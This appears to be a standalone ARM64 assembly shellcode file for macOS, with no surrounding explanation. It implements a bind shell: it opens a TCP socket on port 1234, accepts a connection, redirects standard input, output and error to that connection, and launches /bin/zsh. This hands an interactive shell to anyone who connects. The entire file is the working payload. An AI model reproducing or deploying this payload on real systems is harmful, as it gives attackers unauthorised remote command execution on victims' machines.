.global _main
.align 4


_main:
; socket descriptor
    mov     X0, #2  ; domain = PF_INET
    mov     X1, #1 ; type = SOCk_stream
    mov     X2, XZR ; protocol = IPPROTO_IP
    mov     X16, #97 ; BSD syscall 97 for socket
    svc     #0xffff ; execute syscall
    mov     X11, X0 ; save socket descriptor

    ; bind socket to local address

    mov     X2, #16 ; address_len = 16 bytes
    mov     X4, #0x0200 ; sin_len = 0 , sin_family = 2
    movk    X4, #0xD204, lsl#16 ; sin_port = 1234 = 0x04D2 (big endian for TCP/IP)
    stp     X4, XZR, [SP, #-16]! ; push sockaddr_in in stack
    mov     X1, SP ; pointer to sockaddr_in structure
    mov     X16, #104 ; BSD syscall 104 for bind
    svc     #0xffff ; execute syscall

    ; listen for incoming connections

    mov     X0, X11 ; restore saved socket descriptor
    mov     X1, XZR ; backlog = null
    mov     X16, #106 ; BSD syscall 106 for listen
    svc     #0xffff ; execute syscall

    ; accept incoming connections


    mov     X0, X11 ; restore original socket descriptor
    mov     X1, XZR ; ignore address SOCk_stream
    mov     X2, XZR ; ignore length of address structure
    mov     X16, #30 ; BSD syscall 30 for accept
    svc     #0xffff ; execute syscall
    mov    X12, X0 ; save new socket descriptor


    ; duplicate file descriptors STDIN , STDOUT, STDERR

    mov     X16, #90 ; BSD syscall 90 for dup2
    mov     X1, #2 ; file descriptor 2 = STDERR
    svc     #0xffff ; execute syscall
    mov     X0, X12 ; restore new socket descriptor 
    mov     X1, #1 ; file descriptor 1 = StdOut
    svc     #0xffff ; execute syscall
    mov     X0, X12 ; restore new socket descriptor
    lsr     X1, X1, #1 ; file descriptor 0 = STDIN
    svc     #0xffff ; execute syscall


    ; launch shell via execve

    mov     X3, #0x622F ; move "/bin/zsh" into X3 (little endian) in four moves
    movk    X3, #0x6E69, lsl#16
    movk    X3, #0x7A2F, lsl#32
    movk    X3, #0x6873, lsl#48

    stp     X3, XZR, [SP, #-16]! ; push path and terminating 0 to stack
    mov     X0, SP ; save pointer to argv[0]
    stp     X0, XZR, [SP, #-16]! ; push argv[0] and terminating 0 to stack
    mov     X1, SP ; move pointer to argument into X1
    mov     X2, XZR ; third argument for execve
    mov     X16, #59 ; BSD syscall 59 for execve
    svc     #0xffff ; execute syscall
